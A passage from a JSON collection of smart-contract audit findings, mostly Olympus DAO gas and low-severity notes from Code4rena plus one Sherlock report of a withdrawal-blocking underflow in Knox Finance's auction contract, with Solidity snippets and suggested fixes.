      "summary": "\nThis bug report is about an underflow in the ```_previewWithdraw``` function in the ```AuctionInternal.sol``` file. The bug occurs when the totalContractsSold variable exceeds the auction's totalContracts. This can happen when multiple orders are made before the start of an auction and the ```_processOrders``` function is not called for every new order. This leads to the calculation for the partial fill (remainder) on line 318 underflowing and the transaction reverting. As a result, users would be unable to withdraw from the Auction contract.\n\nThe bug was found by dipp, \\_\\_141345\\_\\_, Trumpero, 0x52, hansfriese, and yixxas. The code snippets used in the report are from the ```AuctionInternal.sol``` file, lines 312-321, 479-489, and 545-562.\n\nThe recommendation to fix this bug is to add a condition to the loop in ```_previewWithdraw``` which checks if the current totalContractsSold is greater than or equal to totalContracts. If it is, then the remainder should be set to 0 which would allow the current order to be fully refunded. Additionally, the orders for an auction should be checked before the auction starts. In ```_addOrder```, consider adding a condition that will call ```_processOrders``` if the auction has not started yet. If ```_processOrders``` returns true then do not allow the order to be added. Or just allow the auction to be finalized before it starts if the total contracts sold has reached the auction's totalContracts.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/106",
      "tags": [
        "Overflow/Underflow"
      ],
      "finders": [
        "0x52",
        "yixxas",
        "Trumpero",
        "dipp",
        "hansfriese",
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "24196",
      "title": "[N-04] PRICE: stale price",
      "impact": "LOW",
      "content": "\nThere is no indicator whether the price information is up-to-date. If the price information is not properly updated, the other contracts will keep using the data resulting in incorrect prices for swap.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24195",
      "title": "[N-03] RANGE, PRICE: unused import of `FullMath`",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L18>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L23>\n\nThe modules `RANGE` and `PRICE` imports `FullMath`, but it is not used.\n\n```solidity\n// modules/PRICE.sol\n 22 contract OlympusPrice is Module {\n 23     using FullMath for uint256;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24194",
      "title": "[N-02] INSTR, Governance: upon module's upgrade, all instruction data should be carried over to the new modules",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L187>\n\nThe `Governance`'s logic will break if the `INSTR` module is upgraded to a new contract without having the same instructions data,  since the `proposalId`'s the `Governance` is using are bound to the `INSTR` module.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24193",
      "title": "[N-01] Kernel: missing zero address check for `executor` and `admin`",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L250-L253>\n\nThe `executor` and `admin` are not checked for the zero address when set by the `Kernel::executeAction`.\n\n```solidity\n// Kernel::executeAction\n250         } else if (action_ == Actions.ChangeExecutor) {\n251             executor = target_;\n252         } else if (action_ == Actions.ChangeAdmin) {\n253             admin = target_;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5578",
      "title": "[G-14] `revert` operator should be in the code as early as reasonably possible (3 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **200**<br>\nMethod Call Gas Saved: **1 559+**<br>\n\n*   src/modules/INSTR.sol:[43-48](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L43-L48)\n\n```solidity\n43        uint256 length = instructions_.length;\n44        uint256 instructionsId = ++totalInstructions;\n45\n46        Instruction[] storage instructions = storedInstructions[instructionsId];\n47\n48        if (length == 0) revert INSTR_InstructionsCannotBeEmpty(); // @note after 43\n```\n\n*   src/policies/Governance.sol:[180-191](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L180-L191), [241-249](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L241-L249)\n\n```solidity\n180    function endorseProposal(uint256 proposalId_) external {\n181        uint256 userVotes = VOTES.balanceOf(msg.sender); // @note put after revert\n182\n183        if (proposalId_ == 0) {\n184            revert CannotEndorseNullProposal();\n185        }\n186\n187        Instruction[] memory instructions = INSTR.getInstructions(proposalId_);\n188        if (instructions.length == 0) {\n189            revert CannotEndorseInvalidProposal();\n190        }\n191\n```\n\n```solidity\n241        uint256 userVotes = VOTES.balanceOf(msg.sender); // @note put after revert\n242\n243        if (activeProposal.proposalId == 0) {\n244            revert NoActiveProposalDetected();\n245        }\n246\n247        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\n248            revert UserAlreadyVoted();\n249        }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-14-revert-operator-should-be-in-the-code-as-early-as-reasonably-possible-3-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5577",
      "title": "[G-11] `x = x + y` is cheaper than `x += y;` (6 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **5 000**\n\nUsually does not work with struct and mappings.\n\n*   src/modules/PRICE.sol:[136](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L136), [138](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L138), [222](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L222)\n\n```solidity\n136            _movingAverage += (currentPrice - earliestPrice) / numObs;\n...\n138            _movingAverage -= (earliestPrice - currentPrice) / numObs;\n...\n222            total += startObservations_[i];\n```\n\n*   src/modules/VOTES.sol:[56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L56), [58](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L58)\n\n```solidity\n56        balanceOf[from_] -= amount_;\n...\n58            balanceOf[to_] += amount_;\n```\n\n*   src/policies/Heart.sol:[103](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L103)\n\n```solidity\n103        lastBeat += frequency();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-11-x--x--y-is-cheaper-than-x--y-6-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5576",
      "title": "[G-02]  `storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping` (7 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **188 639**<br>\nMethod Call Gas Saved: **5 032**<br>\n\nIt may not be obvious, but every time you copy a storage `struct`/`array`/`mapping` to a `memory` variable, you are literally copying each member by reading it from `storage`, which is expensive. And when you use the `storage` keyword, you are just storing a pointer to the storage, which is much cheaper.\n\n*   src/Kernel.sol:[379](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L379)\n\n```solidity\n379        Policy[] memory dependents = moduleDependents[keycode_];\n```\n\nfix(the same for others):\n\n```solidity\nPolicy[] storage dependents = moduleDependents[keycode_];\n```\n\n*   src/policies/BondCallback.sol:[179](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L179)\n\n```solidity\n179        uint256[2] memory marketAmounts = _amountsPerMarket[id_];\n```\n\n*   src/policies/Governance.sol:[206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L206)\n\n```solidity\n206        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];\n```\n\n*   src/policies/Operator.sol:[205-206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L205-L206), [384-385](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L384-L385), [439-440](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L439-L440), [666](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L666)\n\n```solidity\n205        /// Cache config in memory\n206        Config memory config_ = _config;\n...\n384            /// Cache config struct to avoid multiple SLOADs\n385            Config memory config_ = _config;\n...\n439            /// Cache config struct to avoid multiple SLOADs\n440            Config memory config_ = _config;\n...\n666        Regen memory regen = _status.low;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-02--storage-pointer-to-a-structure-is-cheaper-than-copying-each-value-of-the-structure-into-memory-same-for-array-and-mapping-7-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5154",
      "title": "[G-15] Duplicated require()/revert() checks should be refactored to a modifier or function",
      "impact": "GAS",
      "content": "\nMethod Call Gas Saved: **8 111**\n\n*   [src/modules/PRICE.sol](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol)\n\n```solidity\nif (!initialized) revert Price_NotInitialized(); // @note 4 instances\n```\n\n**[0xLienid (Olympus) confirmed](https://github.com/code-423n4/2022-08-olympus-findings/issues/39)**\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-15-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "5152",
      "title": "[G-13] Don't compare boolean expressions to boolean literals (2 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **1 607**\n\n*   src/policies/Governance.sol:[223](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L223), [306](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L306)\n\n```solidity\n223        if (proposalHasBeenActivated[proposalId_] == true) {\n...\n306        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-13-dont-compare-boolean-expressions-to-boolean-literals-2-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5151",
      "title": "[G-12] Deleting a struct is cheaper than creating a new struct with null values. (1 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **4 207**<br>\nMethod Call Gas Saved: **40**<br>\n\n*   src/policies/Governance.sol:[288](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L288)\n\n```solidity\n288        activeProposal = ActivatedProposal(0, 0);\n```\n\nfix:\n\n```solidity\n    delete activeProposal;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-12-deleting-a-struct-is-cheaper-than-creating-a-new-struct-with-null-values-1-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5149",
      "title": "[G-10] Use named `returns` for local variables where it is possible (3 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **5 400**\n\n*   src/Kernel.sol:[130-135](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L130-L135)\n\n```solidity\n130    /// @notice Function to grab module address from a given keycode.\n131    function getModuleAddress(Keycode keycode_) internal view returns (address) {\n132        address moduleForKeycode = address(kernel.getModuleForKeycode(keycode_));\n133        if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);\n134        return moduleForKeycode;\n135    }\n```\n\nfix:\n\n```solidity\n    function getModuleAddress(Keycode keycode_) internal view returns (address moduleForKeycode) {\n        moduleForKeycode = address(kernel.getModuleForKeycode(keycode_));\n        if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);\n    }\n```\n\n*   src/modules/INSTR.sol:[41-79](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L41-L79)\n\n```solidity\n41    /// @notice Store a list of Instructions to be executed in the future.\n42    function store(Instruction[] calldata instructions_) external permissioned returns (uint256) {\n43        uint256 length = instructions_.length;\n44        uint256 instructionsId = ++totalInstructions;\n45\n46        Instruction[] storage instructions = storedInstructions[instructionsId];\n...\n76        emit InstructionsStored(instructionsId);\n77\n78        return instructionsId;\n79    }\n```\n\n*   src/modules/PRICE.sol:[153-180](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L153-L180)\n\n```solidity\n153    /// @notice Get the current price of OHM in the Reserve asset from the price feeds\n154    function getCurrentPrice() public view returns (uint256) {\n...\n177        uint256 currentPrice = (ohmEthPrice * _scaleFactor) / reserveEthPrice;\n178\n179        return currentPrice;\n180    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-10-use-named-returns-for-local-variables-where-it-is-possible-3-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5148",
      "title": "[G-09] Increment optimization (18 instances)",
      "impact": "GAS",
      "content": "\nFor a uint256 i variable, the following is true with the Optimizer enabled at 10k:\n\nIncrement:\n\ni += 1 is the most expensive form<br>\ni++ costs 6 gas less than i += 1<br>\n\\++i costs 5 gas less than i++ (11 gas less than i += 1)<br>\n\nDecrement:\n\ni -= 1 is the most expensive form<br>\ni-- costs 11 gas less than i -= 1<br>\n\\--i costs 5 gas less than i-- (16 gas less than i -= 1)<br>\n\n### [G-09.1]  Prefix increments are cheaper than postfix increments, especially when it's used in for-loops (3 instances).\n\nDeployment Gas Saved: **400**\n\n*   src/utils/KernelUtils.sol:[49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49), [64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)\n\n```solidity\n49            i++;\n...\n64            i++;\n```\n\n*   src/policies/Operator.sol:[488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488)\n\nNOTE: in case of 670 675 686 691 not applicable and gas will be lost\n\n```solidity\n488            decimals++;\n```\n\n### [G-09.2] `<x> = <x> + 1` even more efficient than pre increment.(18 instances)\n\nDeployment Gas Saved: **14 217**\n\n*   src/utils/KernelUtils.sol:[49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49), [64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)\n\n```solidity\n49            i++;\n...\n64            i++;\n```\n\n*   src/policies/Operator.sol:[488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488), [670](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L670), [675](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L675), [686](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L686), [691](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L691)\n*\n\n```solidity\n488            decimals++;\n...\n670                _status.low.count++;\n...\n675                _status.low.count--;\n...\n686                _status.high.count++;\n...\n691                _status.high.count--;\n```\n\n*   src/Kernel.sol:[313](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L313), [357](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L357), [369](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L369), [386](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L386), [404](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L404), [429](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L429)\n\n```solidity\n313                ++i;\n...\n357                ++i;\n...\n369                ++j;\n...\n386                ++i;\n...\n404                ++i;\n...\n429                ++i;\n```\n\n*   src/modules/INSTR.sol:[72](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L72)\n\n```solidity\n72                ++i;\n```\n\n*   src/modules/PRICE.sol:[225](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L225)\n\n```solidity\n225                ++i;\n```\n\n*   src/policies/BondCallback.sol:[163](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L163)\n\n```solidity\n163                ++i;\n```\n\n*   src/policies/Governance.sol:[281](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L281)\n\n```solidity\n281                ++step;\n```\n\n*   src/policies/TreasuryCustodian.sol:[62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L62)\n\n```solidity\n62                ++j;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-09-increment-optimization-18-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5147",
      "title": "[G-08] Expressions that cannot be overflowed can be unchecked (5 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **23 016**\n\n*   src/Kernel.sol:[299-300](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L299-L300), [309-310](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L309-L310)\n\n```solidity\n299        activePolicies.push(policy_);\n300        getPolicyIndex[policy_] = activePolicies.length - 1; // @note cannot be overflowed due to a previous push\n...\n309            moduleDependents[keycode].push(policy_);\n310            getDependentIndex[keycode][policy_] = moduleDependents[keycode].length - 1; // @note cannot be overflowed due to a previous push\n```\n\n*   src/modules/PRICE.sol:[89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L89), [144](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144), [171](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L171)\n\n```solidity\n89         uint256 exponent = decimals + reserveEthDecimals - ohmEthDecimals; //@note overflow is not possible, if an underflow occurs, the next statement will revert\n...\n144        nextObsIndex = (nextObsIndex + 1) % numObs; //@note numObs can not be equal 0 during to check in constructor\n...\n171            if (updatedAt < block.timestamp - uint256(observationFrequency)) // @note can not be underflowed due to ` - 3 * uint256(observationFrequency)` in 165\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-08-expressions-that-cannot-be-overflowed-can-be-unchecked-5-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5146",
      "title": "[G-07] State variables can be packed into fewer storage slots (3 instances)",
      "impact": "GAS",
      "content": "\nIf variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables can also be cheaper.\n\n**NOTE**: one slot = 32 bytes\n\nDeployment Gas Saved: **23 292**<br>\nMethod Call Gas Saved: **1 711**<br>\n\n*   src/policies/Heart.sol:[32-48](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L32-L48)\n\nuint256(32), address(20), bool(1)\n\n```solidity\n32     /// @notice Status of the Heart, false = stopped, true = beating\n33     bool public active; // @note put below _operator\n34\n35     /// @notice Timestamp of the last beat (UTC, in seconds)\n36     uint256 public lastBeat;\n37\n38     /// @notice Reward for beating the Heart (in reward token decimals)\n39     uint256 public reward;\n40\n41     /// @notice Reward token address that users are sent for beating the Heart\n42     ERC20 public rewardToken;\n43\n44     // Modules\n45     OlympusPrice internal PRICE;\n46\n47     // Policies\n48     IOperator internal _operator;\n```\n\nfix:\n\n```solidity\nuint256 public lastBeat;\nuint256 public reward;\nERC20 public rewardToken;\nOlympusPrice internal PRICE;\nIOperator internal _operator;\nbool public active;\n```\n\n*   src/modules/PRICE.sol:[31-65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L31-L65)\n\n**NOTE**: PRICE is Module, Module is KernelAdapter, so real first variable in PRICE is kernel from KernelAdapter\n\nuint256(32), uint32(4), uint48(6), uint8(1), array(32), address(20), bool(1)\n\n```solidity\ninherit Kernel public kernel;\n...\n31     /// @dev    Price feeds. Chainlink typically provides price feeds for an asset in ETH. Therefore, we use two price feeds against ETH, one for OHM and one for the Reserve asset, to calculate the relative price of OHM in the Reserve asset.\n32     AggregatorV2V3Interface internal immutable _ohmEthPriceFeed;\n33     AggregatorV2V3Interface internal immutable _reserveEthPriceFeed;\n34\n35     /// @dev Moving average data\n36     uint256 internal _movingAverage; /// See getMovingAverage()\n37\n38     /// @notice Array of price observations. Check nextObsIndex to determine latest data point.\n39     /// @dev    Observations are stored in a ring buffer where the moving average is the sum of all observations divided by the number of observations.\n40     ///         Observations can be cleared by changing the movingAverageDuration or observationFrequency and must be re-initialized.\n41     uint256[] public observations;\n42\n43     /// @notice Index of the next observation to make. The current value at this index is the oldest observation.\n44     uint32 public nextObsIndex;\n45\n46     /// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.\n47     uint32 public numObservations;\n48\n49     /// @notice Frequency (in seconds) that observations should be stored.\n50     uint48 public observationFrequency;\n51\n52     /// @notice Duration (in seconds) over which the moving average is calculated.\n53     uint48 public movingAverageDuration;\n54\n55     /// @notice Unix timestamp of last observation (in seconds).\n56     uint48 public lastObservationTime;\n57\n58     /// @notice Number of decimals in the price values provided by the contract.\n59     uint8 public constant decimals = 18;\n60\n61     /// @notice Whether the price module is initialized (and therefore active).\n62     bool public initialized;\n63\n64     // Scale factor for converting prices, calculated from decimal values.\n65     uint256 internal immutable _scaleFactor;\n```\n\nfix:\n\n```solidity\nuint48 public observationFrequency;\nuint48 public movingAverageDuration;\nAggregatorV2V3Interface internal immutable _ohmEthPriceFeed;\nAggregatorV2V3Interface internal immutable _reserveEthPriceFeed;\nuint256 internal _movingAverage; /// See getMovingAverage()\nuint256[] public observations;\nuint32 public nextObsIndex;\nuint32 public numObservations;\nuint48 public lastObservationTime;\nuint8 public constant decimals = 18;\nbool public initialized;\nuint256 internal immutable _scaleFactor;\n```\n\n*   src/policies/Operator.sol:[58-89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L58-L89)\n\nuint32(4), uint8(1), address(20), bool(1)\n\n```solidity\n58     /// Operator variables, defined in the interface on the external getter functions\n59     Status internal _status;\n60     Config internal _config;\n61\n62     /// @notice    Whether the Operator has been initialized\n63     bool public initialized;\n64\n65     /// @notice    Whether the Operator is active\n66     bool public active;\n67\n68     /// Modules\n69     OlympusPrice internal PRICE;\n70     OlympusRange internal RANGE;\n71     OlympusTreasury internal TRSRY;\n72     OlympusMinter internal MINTR;\n73\n74     /// External contracts\n75     /// @notice     Auctioneer contract used for cushion bond market deployments\n76     IBondAuctioneer public auctioneer;\n77     /// @notice     Callback contract used for cushion bond market payouts\n78     IBondCallback public callback;\n79\n80     /// Tokens\n81     /// @notice     OHM token contract\n82     ERC20 public immutable ohm;\n83     uint8 public immutable ohmDecimals;\n84     /// @notice     Reserve token contract\n85     ERC20 public immutable reserve;\n86     uint8 public immutable reserveDecimals;\n87\n88     /// Constants\n89     uint32 public constant FACTOR_SCALE = 1e4;\n```\n\nfix:\n\n```solidity\nStatus internal _status;\nConfig internal _config;\nOlympusPrice internal PRICE;\nOlympusRange internal RANGE;\nOlympusTreasury internal TRSRY;\nOlympusMinter internal MINTR;\nIBondAuctioneer public auctioneer;\nIBondCallback public callback;\nbool public initialized;\nbool public active;\nERC20 public immutable ohm;\nuint8 public immutable ohmDecimals;\nERC20 public immutable reserve;\nuint8 public immutable reserveDecimals;\nuint32 public constant FACTOR_SCALE = 1e4;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-07-state-variables-can-be-packed-into-fewer-storage-slots-3-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5145",
      "title": "[G-06]  Using bools for storage incurs overhead (6 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **23 611**<br>\nMethod Call Gas Saved: **4 485**<br>\n\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n\nUse uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past.\n\n**Important**: This rule doesn't always work, sometimes a bool is packed with another variable in the same slot, sometimes it's packed into a struct, sometimes the optimizer makes bool more efficient. You can see the @note in the code for each case.\n\n*   src/Kernel.sol:[181](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L181), [194](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L194), [197](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L197)\n\n```solidity\n181    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; //@note D:3200 M:1754\n...\n194    mapping(address => mapping(Role => bool)) public hasRole; //@note D:âˆ’3016 M:2298\n...\n197    mapping(Role => bool) public isRole; //@note D:2407\n```\n\n*   